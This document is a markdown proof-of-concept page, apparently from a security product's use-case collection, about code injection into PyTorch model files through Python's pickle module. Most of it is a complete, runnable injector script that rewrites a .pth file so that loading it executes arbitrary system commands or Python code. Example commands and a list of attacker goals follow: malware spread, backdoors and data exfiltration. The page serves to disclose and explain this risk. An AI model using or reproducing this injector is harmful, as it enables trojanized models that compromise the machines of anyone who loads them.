
# **ModelArmor Use Case: Pickle Code Injection PoC**

The **Pickle Code Injection Proof of Concept (PoC)** demonstrates the security vulnerabilities in Python's `pickle` module, which can be exploited to execute arbitrary code during deserialization. This method is inherently insecure because it allows execution of arbitrary functions without restrictions or security checks.

## Core Code Overview

**Custom Pickle Injector:**

```python
import os, argparse, pickle, struct, shutil
from pathlib import Path
import torch

class PickleInject:
    def __init__(self, inj_objs, first=True):
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)
            self.save(obj)
            if not self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)
            self.write(pickle.STOP)

    def Pickler(self, file, protocol):
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject:
        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        def __init__(self, args):
            import runpy
            super().__init__(args, command=runpy._run_code)
            def __reduce__(self):
                return self.command, (self.args, {})

# Parse Arguments
parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
parser.add_argument("model", type=Path)
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
parser.add_argument("args")
args = parser.parse_args()

# Payload construction
command_args = args.args
if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

if args.command == "system":
    payload = PickleInject.System(command_args)
elif args.command == "exec":
    payload = PickleInject.Exec(command_args)
elif args.command == "eval":
    payload = PickleInject.Eval(command_args)
elif args.command == "runpy":
    payload = PickleInject.RunPy(command_args)

# Save the injected payload
backup_path = f"{args.model}.bak"
shutil.copyfile(args.model, backup_path)
torch.save(torch.load(args.model), f=args.model, pickle_module=PickleInject([payload]))
```

## Example Exploits

1. **Print Injection:**

   ```bash
   python torch_pickle_inject.py model.pth exec "print('hello')"
   ```

2. **Install Packages:**

   ```bash
   python torch_pickle_inject.py model.pth system "pip install numpy"
   ```

3. **Adversarial Command Execution:** Upon loading the tampered model:

   ```bash
   python main.py
   ```

   Output:

   - Installs the package or executes the payload.
   - Alters model behavior: changes predictions, losses, etc.

## Attacker Use Cases

1. **Spreading Malware:** The injected code can download and install malware on the target machine, which can then be used to infect other systems in the network or create a botnet.
2. **Backdoor Installation:** An attacker can use pickle injection to install a backdoor that allows persistent access to the system, even if the original vulnerability is patched.
3. **Data Exfiltration:** An attacker can use pickle injection to read sensitive files or data from the system and send it to a remote server. This can include configuration files, database credentials, or any other sensitive information stored on the machine.

## Key Risks

The `pickle` module is inherently insecure for handling untrusted input due to its ability to execute arbitrary code.

Ref: <https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC>

---
